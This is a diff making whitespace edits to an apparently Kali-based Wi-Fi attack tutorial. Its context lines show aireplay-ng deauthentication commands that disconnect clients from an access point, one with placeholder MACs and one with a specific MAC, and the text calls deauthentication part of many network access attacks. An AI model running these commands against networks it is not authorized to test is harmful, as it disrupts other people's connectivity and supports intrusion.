@@ -56,6 +56,7 @@ Now you can deauthenticate any client as your wish by the below command
 
 
 ```bash
+
 root@kali:~# aireplay-ng --deauth 10000 -a (MAC ADDRESS OF TARGET ACCESS POINT) -c (MAC ADDRESS OF MACINE TO DISCONNET) wlan0
 
 ```
@@ -157,6 +158,5 @@ root@kali:~# aireplay-ng --deauth 10000 -a 56:13:58:76:5B:55 wlan0
 
 See deauthentication attack is required in many  attack,  you can treat it as a small part of many network accessing attacks so keep a good grip on it.
 
----
 
 **Author** - [Error](https://github.com/Error-200)
